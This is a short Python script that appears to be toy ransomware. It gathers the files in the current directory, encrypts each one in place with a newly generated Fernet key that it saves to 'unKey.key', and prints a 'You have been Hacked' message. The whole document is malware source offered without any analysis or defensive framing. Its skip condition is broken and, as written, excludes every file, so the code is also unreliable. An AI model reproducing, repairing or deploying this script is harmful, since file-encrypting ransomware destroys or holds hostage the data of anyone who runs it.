 #!/usr/bin/env python3

import os 
from cryptography.fernet import Fernet
files=[]

for file in os.listdir():
	# if file=="rans.py" or file=="unKey.key" or file=="decrypt.py":
	if os.path.basename(__file__) or file=="unKey.key" or file=="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

key = Fernet.generate_key()
with open("unKey.key","wb") as uk:
	uk.write(key)

for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_encrypted=Fernet(key).encrypt(contents)
	with open(file,"wb") as thefile:
		thefile.write(contents_encrypted)
print("-----------------You have been Hacked!!!!!!!-------------")
input()